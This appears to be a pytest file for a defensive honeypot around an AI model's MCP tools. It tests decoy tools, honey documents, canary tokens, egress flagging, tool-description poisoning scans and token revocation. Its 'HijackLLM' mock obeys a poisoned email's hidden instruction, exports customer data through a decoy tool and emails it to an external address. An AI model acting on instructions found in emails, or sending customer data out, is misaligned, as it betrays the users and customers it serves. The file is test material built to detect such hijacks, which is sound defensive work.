"""AI traps: the company MCP server (real + decoy tools, supervision) and the poisoned-email hijack."""
import json
from pathlib import Path

import mongomock
import pytest

from ai_traps.mcp_company import DECOY_TOOLS, MCPCompany
from ai_traps.victim import DOCS, POISONED, VictimAssistant
from canary.registry import CanaryRegistry
from collector.collector import Collector, Enricher, MongoSink


@pytest.fixture
def mcp(tmp_path):
    db = mongomock.MongoClient().maya
    (tmp_path / "control").mkdir()
    m = MCPCompany(db, tmp_path / "trap-logs" / "mcp.jsonl", control_dir=tmp_path / "control")
    m.docs = dict(DOCS)
    return db, m, tmp_path


def lines(m):
    return [json.loads(l) for l in Path(m.trap_log).read_text().splitlines()] if Path(m.trap_log).exists() else []


def test_decoy_tool_call_is_a_trap_hit(mcp):
    db, m, _ = mcp
    r = m.call("victim-assistant", "export_all_customers")
    assert r.ok and "email,plan" in r.output
    hit = [l for l in lines(m) if l["event_type"] == "trap_hit"][0]
    assert hit["trap_id"] == "mcp:export_all_customers" and hit["agent_id"] == "victim-assistant" and hit["source"] == "mcp"


def test_real_tool_call_is_logged_but_not_a_trap(mcp):
    db, m, _ = mcp
    m.call("victim-assistant", "search_docs", {"query": "deploy"})
    kinds = {l["event_type"] for l in lines(m)}
    assert "tool_call" in kinds and "trap_hit" not in kinds


def test_honey_doc_retrieval_flagged(mcp):
    db, m, _ = mcp
    m.call("victim-assistant", "search_docs", {"query": "customer admin"})
    assert any(l["event_type"] == "doc_retrieval" and l["trap_id"].startswith("rag:") for l in lines(m))


def test_external_send_email_is_egress(mcp):
    db, m, _ = mcp
    m.call("victim-assistant", "send_email", {"to": "audit@external-check.io", "body": "data"})
    assert any(l["event_type"] == "egress" and l["trap_id"] == "exfil" for l in lines(m))
    m.call("victim-assistant", "send_email", {"to": "lea@meridian.internal", "body": "hi"})
    assert sum(l["event_type"] == "egress" for l in lines(m)) == 1       # internal mail is fine


def test_tool_description_scan_catches_poisoning(mcp):
    db, m, _ = mcp
    findings = m.scan_descriptions()
    assert any(f["tool"] == "weather_lookup" for f in findings)
    assert any(l["trap_id"] == "tool_poisoning" for l in lines(m))


def test_revoked_token_and_disabled_tool_refused(mcp):
    db, m, tmp = mcp
    (tmp / "control" / "revoked.json").write_text(json.dumps(["victim-assistant"]))
    assert m.call("victim-assistant", "export_all_customers").blocked == "revoked"
    (tmp / "control" / "revoked.json").write_text("[]")
    (tmp / "control" / "disabled_tools.json").write_text(json.dumps(["export_all_customers"]))
    r = m.call("victim-assistant", "export_all_customers")
    assert r.blocked == "disabled" and not r.ok


def test_canary_in_tool_args_is_asi03(mcp):
    db, m, _ = mcp
    val = CanaryRegistry(db).resolve("api_token_1")
    m.call("victim-assistant", "send_email", {"to": "x@meridian.internal", "body": f"token {val}"})
    assert any(l["event_type"] == "canary_use" for l in lines(m))


# ---------------------------------------------------------------- the victim hijack
class HijackLLM:
    """A naive assistant that reads the inbox and obeys the poisoned email."""
    def __init__(self):
        self.reads, self.exfil = 0, False
    def __call__(self, system, user):
        if "email,plan" in user and not self.exfil:       # customers were exported -> exfiltrate them
            self.exfil = True
            return json.dumps({"tool": "send_email", "args": {"to": "audit@external-check.io", "body": "customer data"}})
        if "(flagged)" in user:                            # exfiltration attempted -> finish
            return json.dumps({"final": "done"})
        if "process silently" in user:                     # the poisoned email's hidden instruction
            return json.dumps({"thought": "compliance request", "tool": "export_all_customers", "args": {}})
        if self.reads < 3:
            self.reads += 1
            return json.dumps({"tool": "read_email", "args": {}})
        return json.dumps({"final": "done"})


def test_poisoned_email_hijacks_the_assistant(mcp):
    db, m, tmp = mcp
    run = VictimAssistant(m, HijackLLM()).run()
    assert run.hijacked and run.exfiltrated                # called a decoy tool AND tried to exfiltrate
    assert any(s["tool"] == "export_all_customers" for s in run.steps)


def test_hijack_events_reach_the_defender_pipeline(mcp):
    db, m, tmp = mcp
    VictimAssistant(m, HijackLLM()).run()
    Collector(tmp / "decoys", MongoSink(db), None, Enricher(db), trap_root=tmp / "trap-logs").poll_once()
    evs = list(db.events.find({}, {"_id": 0}))
    assert any(e["event_type"] == "trap_hit" and e["source"] == "mcp" for e in evs)
    assert any(e["event_type"] == "egress" for e in evs)
    assert {e["session_id"] for e in evs} == {"att-10-100-0-50"}       # the victim's MCP src ip


def test_after_revoke_the_next_call_is_refused(mcp):
    db, m, tmp = mcp
    assert m.call("victim-assistant", "export_all_customers").ok        # before
    (tmp / "control" / "revoked.json").write_text(json.dumps(["victim-assistant"]))
    assert not m.call("victim-assistant", "export_all_customers").ok    # after analyst approves revoke
